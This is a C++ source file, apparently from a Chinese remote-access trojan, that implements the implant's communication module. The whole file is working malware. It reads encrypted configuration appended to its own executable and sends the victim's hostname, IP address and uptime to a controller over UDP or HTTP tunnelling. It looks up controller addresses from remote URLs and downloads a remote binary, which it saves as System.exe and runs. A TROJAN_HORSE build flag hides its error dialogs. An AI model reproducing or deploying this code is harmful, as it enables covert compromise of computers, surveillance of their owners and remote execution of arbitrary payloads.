//Download by http://www.NewXing.com
// Community.cpp: implementation of the CCommunity class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Server.h"
#include "Community.h"

#include <afxinet.h>
#include "Md5.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif
//************参数设定*******************

//***************************************
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CCommunity::CCommunity()
{
	gethostname(m_cHostname,128);
	//本机的主机名//////////////////////////////
	m_strHostName=RegReadValue(HKEY_LOCAL_MACHINE,
		"System\\CurrentControlSet\\control\\ComputerName\\ComputerName","ComputerName");
	////////////////////////////////////////////
	DWORD dwData;//读取注册表,判断IE是否设置了代理,如果设了,那么就用HTTP隧道技术
	DWORD dwBufferSize=4;
	RegReadValue(
		/*IN */HKEY_CURRENT_USER,
		/*IN */"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
		/*IN */"ProxyEnable",
		/*IN */REG_DWORD,
		/*OUT*/(LPBYTE)&dwData,
		/*IN/OUT*/&dwBufferSize);
	if(dwData)
		m_bIsProxy=TRUE;
	else
		m_bIsProxy=FALSE;
	///////////////////////////////////////////////////////////////////////////
#if TROJAN_HORSE || ONLINE_TEST
	SERVER_CONFIG	stServerConfig;

	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.ReleaseBuffer();

	CFile file(exeFullPath,
		CFile::modeRead|CFile::shareDenyNone);
	int nSize=sizeof(stServerConfig);
	file.Seek(-nSize,CFile::end);
	file.Read(&stServerConfig,sizeof(stServerConfig));
	file.Close();

	EncryptData(&stServerConfig,sizeof(stServerConfig),PUBLICPASSWORD);

	m_strDataPassword=CharToCString(stServerConfig.cDataPassword,sizeof(stServerConfig.cDataPassword));
	EncryptData(&stServerConfig,sizeof(stServerConfig)-sizeof(stServerConfig.cDataPassword),m_strDataPassword);

	CString strHttpDirName=CharToCString(stServerConfig.cHttpDirName,sizeof(stServerConfig.cHttpDirName));//存放数据文件的位置
	CString strNotifyFilename=CharToCString(stServerConfig.cNotifyFilename,sizeof(stServerConfig.cNotifyFilename));
	CString strConnectFilename=CharToCString(stServerConfig.cConnectFilename,sizeof(stServerConfig.cConnectFilename));
	CString strDownloadFilename=CharToCString(stServerConfig.cDownloadFilename,sizeof(stServerConfig.cDownloadFilename));
	m_strKeyName=CharToCString(stServerConfig.cKeyName,sizeof(stServerConfig.cKeyName));
	m_strFilename=CharToCString(stServerConfig.cFilename,sizeof(stServerConfig.cFilename));
	m_strNote=CharToCString(stServerConfig.cNote,sizeof(stServerConfig.cNote));
	memcpy(m_byCheckSum,stServerConfig.byCheckSum,sizeof(stServerConfig.byCheckSum));
	///////////////////////////////////////////////////////////////////////////
	m_strNotifyInfoURL=strHttpDirName+strNotifyFilename;
	m_strConnectInfoURL=strHttpDirName+strConnectFilename;
	m_strDownloadInfoURL=strHttpDirName+strDownloadFilename;

	//生成服务端上线通知包的MD5校验和
	CMd5 Md5;
	Md5.GetMD5CheckSum((BYTE*)m_strNotifyInfoURL.GetBuffer(m_strNotifyInfoURL.GetLength()),
		m_strNotifyInfoURL.GetLength(),m_byCheckSum_NotifyPack);
#endif
}

CCommunity::~CCommunity()
{
}

////////////////////////////////////////////////////////////
BOOL CCommunity::IsOnline()
{
	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
#if ONLINE_TEST
	if(strIPAddr=="127.0.0.1")
		return FALSE;
#endif
	/////////////////////////////////////
	DWORD dwData;//在每次上线时,重新检查是否应该用HTTP隧道技术
	DWORD dwBufferSize=4;
	RegReadValue(
		/*IN */HKEY_CURRENT_USER,
		/*IN */"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
		/*IN */"ProxyEnable",
		/*IN */REG_DWORD,
		/*OUT*/(LPBYTE)&dwData,
		/*IN/OUT*/&dwBufferSize);
	if(dwData)
		m_bIsProxy=TRUE;
	else
		m_bIsProxy=FALSE;
	if(m_bIsProxy)
	{
		m_tmOnlineTime=CTime::GetCurrentTime();//上线时间
	}
	/////////////////////////////////////////////////
	return SendNotify(TRUE);
}

BOOL CCommunity::SendNotify(BOOL bFirst)
{
	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
#if ONLINE_TEST
	if(strIPAddr=="127.0.0.1")
		return FALSE;
#endif
	////////////////////////////////////////////////////////////
	if(m_bIsProxy)	//TCP上线通知
	{
		SERVER_INFO stServerInfo;
		ZeroMemory(&stServerInfo,sizeof(stServerInfo));

		memcpy(stServerInfo.byCheckSum,m_byCheckSum_NotifyPack,sizeof(m_byCheckSum_NotifyPack));
		CStringToChar(stServerInfo.cHostName,m_strHostName);
		IN_ADDR localaddr;
		localaddr.s_addr=inet_addr(strIPAddr);
		memcpy(stServerInfo.cIPAddress,&localaddr,sizeof(localaddr));
		CTimeSpan tsTimeSpan=CTime::GetCurrentTime()-m_tmOnlineTime;
		stServerInfo.lTotalMinutes=tsTimeSpan.GetTotalMinutes();
		////////////////////////////////////////////////
	#if ONLINE_TEST
		IN_ADDR serveraddr;

		int i=0;
		while(1)//读取客户端的IP地址
		{
			TRY
			{
				i++;
				CInternetSession session;
				CInternetFile* pInternetFile=(CInternetFile*)session.OpenURL(m_strNotifyInfoURL,
					NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
				pInternetFile->Read(&serveraddr,sizeof(serveraddr));
				pInternetFile->Close();
				session.Close();
				break;
			}
			CATCH_ALL(e)
			{
				if(i>=3)
				{
					return FALSE;//读取失败,1秒后再试
				}
			}
			END_CATCH_ALL
		}
		EncryptData(&serveraddr,sizeof(serveraddr),m_strDataPassword);
	#else
		IN_ADDR serveraddr;
		serveraddr.s_addr=inet_addr(strIPAddr);
	#endif
		hn = gethostbyname(m_cHostname);
		for(int k=0;hn->h_addr_list[k]!=NULL;k++)
			strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[k]);
		localaddr.s_addr=inet_addr(strIPAddr);//更新本机的IP地址
		memcpy(stServerInfo.cIPAddress,&localaddr,sizeof(localaddr));
		/////////////////////////////////////////////////////////
		CInternetSession*	pSession=NULL;	//HTTP隧道上线通知的Internet会话
		CHttpConnection*	pHttpConn=NULL;	//HTTP隧道上线通知的HTTP连接
		CHttpFile*			pHttpFile=NULL;	//HTTP隧道上线通知的HTTP文件

		TRY
		{
			pSession=new CInternetSession(
				"Mozilla/4.0 (compatible; MSIE 5.0; Win32)",
				1,
				INTERNET_OPEN_TYPE_PRECONFIG,
				NULL,
				NULL,
				INTERNET_FLAG_DONT_CACHE);

			CString strServer=inet_ntoa(serveraddr);//客户端的IP地址
			INTERNET_PORT nPort=60001;	//客户端接收TCP上线通知的端口号

			pHttpConn=pSession->GetHttpConnection(strServer,nPort,NULL,NULL);
			pHttpFile=pHttpConn->OpenRequest(
				CHttpConnection::HTTP_VERB_POST,//POST请求
				"/index.htm",
				NULL,
				1,
				NULL,
				NULL,
				INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE|
				INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_KEEP_CONNECTION);

			pHttpFile->SendRequestEx(sizeof(stServerInfo));//发送POST请求,即HTTP头
			pHttpFile->Write(&stServerInfo,sizeof(stServerInfo));//发送数据
			pHttpFile->EndRequest();//结束请求
		}
		CATCH_ALL(e)
		{
			//无论是否出错,都要如下这么做
		}
		END_CATCH_ALL

		if(pHttpFile!=NULL)//全部消毁
		{
			pHttpFile->Close();
			delete pHttpFile;
		}
		if(pHttpConn!=NULL)
		{
			pHttpConn->Close();
			delete pHttpConn;
		}
		if(pSession!=NULL)
		{
			pSession->Close();
			delete pSession;
		}
		/////////////////////////////////////////////////////////
		return TRUE;//发送成功或出错,60秒后再发
	}
	else//UDP上线通知//////////////////////////////////////////////////////////
	{
	#if ONLINE_TEST
		IN_ADDR serveraddr;

		int i=0;
		while(1)
		{
			TRY
			{
				i++;
				CInternetSession session;
				CInternetFile* pInternetFile=(CInternetFile*)session.OpenURL(m_strNotifyInfoURL,
					NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
				pInternetFile->Read(&serveraddr,sizeof(serveraddr));
				pInternetFile->Close();
				session.Close();
				break;
			}
			CATCH_ALL(e)
			{
				if(i>=3)
					return FALSE;
			}
			END_CATCH_ALL
		}
		EncryptData(&serveraddr,sizeof(serveraddr),m_strDataPassword);
	#else
		IN_ADDR serveraddr;
		serveraddr.s_addr=inet_addr(strIPAddr);
	#endif
		hn = gethostbyname(m_cHostname);
		for(int k=0;hn->h_addr_list[k]!=NULL;k++)
			strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[k]);
		//////////////////////////////////////////////////
		if(bFirst)
		{
			closesocket(m_hNotifySocket);
			m_hNotifySocket=socket(AF_INET,SOCK_DGRAM,0);
		#if !TROJAN_HORSE
			if(m_hNotifySocket==INVALID_SOCKET)
				AfxMessageBox("socket() failed");
		#endif
			SOCKADDR_IN localsockaddr;
			localsockaddr.sin_family=AF_INET;
			localsockaddr.sin_port=INADDR_ANY;
			localsockaddr.sin_addr.s_addr=inet_addr(strIPAddr);

			int nRet=bind(m_hNotifySocket,(SOCKADDR*)&localsockaddr,sizeof(localsockaddr));
		#if !TROJAN_HORSE
			if(nRet==SOCKET_ERROR)
				AfxMessageBox("bind() failed");
		#endif
			m_tmOnlineTime=CTime::GetCurrentTime();
		}
		//////////////////////////////////////////////////
		SERVER_INFO stServerInfo;
		ZeroMemory(&stServerInfo,sizeof(stServerInfo));

		memcpy(stServerInfo.byCheckSum,m_byCheckSum_NotifyPack,sizeof(m_byCheckSum_NotifyPack));
		CStringToChar(stServerInfo.cHostName,m_strHostName);
		IN_ADDR localaddr;
		localaddr.s_addr=inet_addr(strIPAddr);
		memcpy(stServerInfo.cIPAddress,&localaddr,sizeof(localaddr));
		CTimeSpan tsTimeSpan=CTime::GetCurrentTime()-m_tmOnlineTime;
		stServerInfo.lTotalMinutes=tsTimeSpan.GetTotalMinutes();

		SOCKADDR_IN serversockaddr;
		serversockaddr.sin_family=AF_INET;
		serversockaddr.sin_port=htons(60000);
		serversockaddr.sin_addr=serveraddr;

		int nRet=sendto(m_hNotifySocket,(char*)&stServerInfo,sizeof(stServerInfo),NULL,(SOCKADDR*)&serversockaddr,sizeof(serversockaddr));
		if(nRet==SOCKET_ERROR)
		{
		#if !TROJAN_HORSE
			AfxMessageBox("sendto() failed");
		#endif
			return FALSE;
		}
		return TRUE;//发送成功,60秒后再发
	}
}

void CCommunity::DownloadFile()
{
	DOWNLOAD_FILE_INFO stDownloadFileInfo;

	int i=0;
	while(1)
	{
		TRY
		{
			i++;
			CInternetSession session;
			CInternetFile* pInternetFile=(CInternetFile*)session.OpenURL(m_strDownloadInfoURL,
				NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
			pInternetFile->Read(&stDownloadFileInfo,sizeof(stDownloadFileInfo));
			pInternetFile->Close();
			session.Close();
			break;
		}
		CATCH_ALL(e)
		{
			if(i>=3)
				return;
		}
		END_CATCH_ALL
	}

	EncryptData(&stDownloadFileInfo,sizeof(stDownloadFileInfo),m_strDataPassword);

	//下载文件的MD5校验和
	BYTE byCheckSum[16];
	memcpy(byCheckSum,stDownloadFileInfo.byCheckSum,sizeof(stDownloadFileInfo.byCheckSum));

	//下载文件的URL
	CString strDownloadFileURL=CharToCString(stDownloadFileInfo.cDownloadFileURL,sizeof(stDownloadFileInfo.cDownloadFileURL));
	///////////////////////////////////////////////////////////////////
	//得到现有文件的校验和
	CString strSystemDir;
	GetSystemDirectory(strSystemDir.GetBufferSetLength(MAX_PATH),MAX_PATH);
	strSystemDir.ReleaseBuffer();
	CString strCheckSumFilename=strSystemDir+"\\System.dat";

	CFileFind f;
	if(f.FindFile(strCheckSumFilename))
	{
		CFile CheckSumFile(strCheckSumFilename,CFile::modeRead|CFile::shareDenyNone);

		BYTE byCheckSum_ExistingFile[16];
		CheckSumFile.Read(byCheckSum_ExistingFile,sizeof(byCheckSum_ExistingFile));

		CheckSumFile.Close();

		int nRet=memcmp(byCheckSum,byCheckSum_ExistingFile,sizeof(byCheckSum));
		if(nRet==0)//现有文件的校验和与网上要下载文件的校验和一样,说明是同一文件,不再下载
			return;
	}
	//////////////////////////////////////////////////
	//下载文件
	CString strFileData;
	TRY
	{
		CInternetSession Session;//打开URL
		CHttpFile* pHttpFile=(CHttpFile*)Session.OpenURL(strDownloadFileURL,
			NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);

		DWORD dwStatusCode=0;//取状态码
		BOOL bRet=pHttpFile->QueryInfoStatusCode(dwStatusCode);
		if(!bRet || dwStatusCode!=HTTP_STATUS_OK)//如果执行失败或返回失败
		{
			pHttpFile->Close();
			Session.Close();
			return;//返回
		}

		while(1)//循环下载文件,直到全部下载完成
		{
			CString strBuf;
			int nRet=pHttpFile->Read(strBuf.GetBufferSetLength(1024*4),1024*4);
			if(nRet==0)//连接断开,说明已经全部传送完毕
				break;
			strBuf.ReleaseBuffer(nRet);
			strFileData+=strBuf;
		}
		pHttpFile->Close();
		Session.Close();
	}
	CATCH_ALL(e)
	{
		return;//出错了,返回
	}
	END_CATCH_ALL
	//////////////////////////////////////////////////
	//算出下载回来文件的校验和
	BYTE byCheckSum_DownloadFile[16];

	CMd5 Md5;
	Md5.GetMD5CheckSum((BYTE*)strFileData.GetBuffer(strFileData.GetLength()),
		strFileData.GetLength(),byCheckSum_DownloadFile);

	int nRet=memcmp(byCheckSum,byCheckSum_DownloadFile,sizeof(byCheckSum));
	if(nRet!=0)//下载回来文件的校验和与网上声称的不一样,说明下载时出错了,返回
		return;
	//////////////////////////////////////////////////
	//保存下载文件的MD5校验和
	CFile CheckSumFile(strCheckSumFilename,
		CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);
	CheckSumFile.Write(byCheckSum,sizeof(byCheckSum));
	CheckSumFile.Close();
	//////////////////////////////////////////////////
	//保存下载的文件
	CString strTempDir;
	GetTempPath(MAX_PATH,strTempDir.GetBufferSetLength(MAX_PATH));
	strTempDir.ReleaseBuffer();
	strTempDir=strTempDir.Left(strTempDir.GetLength()-1);

	CString strDownloadFilename=strTempDir+"\\System.exe";

	CFile DownloadFile(strDownloadFilename,
		CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);

	DownloadFile.Write(strFileData.GetBuffer(strFileData.GetLength()),
			strFileData.GetLength());

	DownloadFile.Close();
	//////////////////////////////////////////////////
	//运行下载的文件
	Sleep(1000);
	while((INT)ShellExecute(NULL,NULL,strDownloadFilename,NULL,strTempDir,SW_SHOWNORMAL)<=32)
	{
		Sleep(50);//返回值<=32就是执行失败了,再试
	}
}

//////private///////////////////////////////////////////////
void CCommunity::CStringToChar(char* cText,CString strText)
{
	UINT nSize=strText.GetLength();
	memcpy(cText,strText.GetBuffer(nSize),nSize);
}

CString CCommunity::CharToCString(char* cText,UINT nSize)
{
	CString strText;
	memcpy(strText.GetBuffer(nSize),cText,nSize);
	strText.ReleaseBuffer();
	return strText;
}

CString CCommunity::RegReadValue(HKEY hKey,CString sKey,
								 CString sChildKey)
{
	DWORD dwBufferSize=255;
	CString strResult;
	HKEY hChildKey;
	if(ERROR_SUCCESS!=RegOpenKeyEx(hKey,sKey,0,KEY_READ,&hChildKey))
	{
		return ""; //打开子键
	}
	BYTE * szBuff;
	szBuff = new BYTE[ dwBufferSize ];

	if(ERROR_SUCCESS!=RegQueryValueEx(hChildKey,sChildKey,0,0,
		&szBuff[0],&dwBufferSize))
	{
		return ""; //读键值
	}
	strResult = (CString)szBuff;
	delete[] szBuff;
	RegCloseKey(hChildKey);
	return strResult;
}

BOOL CCommunity::RegReadValue(/*IN */HKEY hKey,/*IN */CString strKey,
							  /*IN */CString strChildKey,/*IN */DWORD dwType,
							  /*OUT*/LPBYTE lpData,/*IN/OUT*/LPDWORD lpcbData)
{
	HKEY hChildKey;
	if(ERROR_SUCCESS!=RegOpenKeyEx(hKey,strKey,0,KEY_READ,&hChildKey))
	{
		return FALSE; //打开子键
	}
	if(ERROR_SUCCESS!=RegQueryValueEx(hChildKey,strChildKey,NULL,&dwType,
		lpData,lpcbData))
	{
		return FALSE; //读键值
	}
	RegCloseKey(hChildKey);
	return TRUE;
}

void CCommunity::EncryptData(LPVOID pVoid,DWORD dwBufLen,CString strKey)
{
	rc4_key key;
	int nKeyLen=strKey.GetLength();

	prepare_key((unsigned char*)strKey.GetBuffer(nKeyLen),nKeyLen,&key);
	rc4((unsigned char*)pVoid,dwBufLen,&key);
}

void CCommunity::prepare_key(unsigned char *key_data_ptr, int key_data_len, rc4_key *key)
{
	unsigned char t;
	unsigned char index1;
	unsigned char index2;
	unsigned char* state;
	short counter;

	state = &key->state[0];
	for(counter = 0; counter < 256; counter++)
		state[counter] =(unsigned char)counter;
	key->x = 0;
	key->y = 0;
	index1 = 0;
	index2 = 0;
	for(counter = 0; counter < 256; counter++)
	{
		index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
		swap_byte(&state[counter], &state[index2]);
		index1 = (index1 + 1) % key_data_len;
	}
}

void CCommunity::rc4(unsigned char *buffer_ptr, DWORD buffer_len, rc4_key *key)
{
	unsigned char t;
	unsigned char x;
	unsigned char y;
	unsigned char* state;
	unsigned char xorIndex;
	DWORD counter;

	x = key->x;
	y = key->y;
	state = &key->state[0];
	for(counter = 0; counter < buffer_len; counter++)
	{
		x = (x + 1) % 256;
		y = (state[x] + y) % 256;
		swap_byte(&state[x], &state[y]);
		xorIndex = (state[x] + state[y]) % 256;
		buffer_ptr[counter] ^= state[xorIndex];
	}
	key->x = x;
	key->y = y;
}

//*************************************************************************/
CString CCommunity::IsConnectServer()
{
	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
	if(strIPAddr=="127.0.0.1")
		return "";

	CLIENT_CONNECT_INFO stClientConnectInfo;

	int i=0;
	while(1)
	{
		TRY
		{
			i++;
			CInternetSession session;
			CInternetFile* pInternetFile=(CInternetFile*)session.OpenURL(m_strConnectInfoURL,
				NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
			pInternetFile->Read(&stClientConnectInfo,sizeof(stClientConnectInfo));
			pInternetFile->Close();
			session.Close();
			break;
		}
		CATCH_ALL(e)
		{
			if(i>=3)
				return "";
		}
		END_CATCH_ALL
	}

	EncryptData(&stClientConnectInfo,sizeof(stClientConnectInfo),m_strDataPassword);

	CString strClientName=CharToCString(stClientConnectInfo.cClientName,sizeof(stClientConnectInfo.cClientName));
	if(strClientName!=m_strHostName)
		return "";
	CString strServerIP=inet_ntoa(*(IN_ADDR*)stClientConnectInfo.cIPAddress);

	return strServerIP;
}
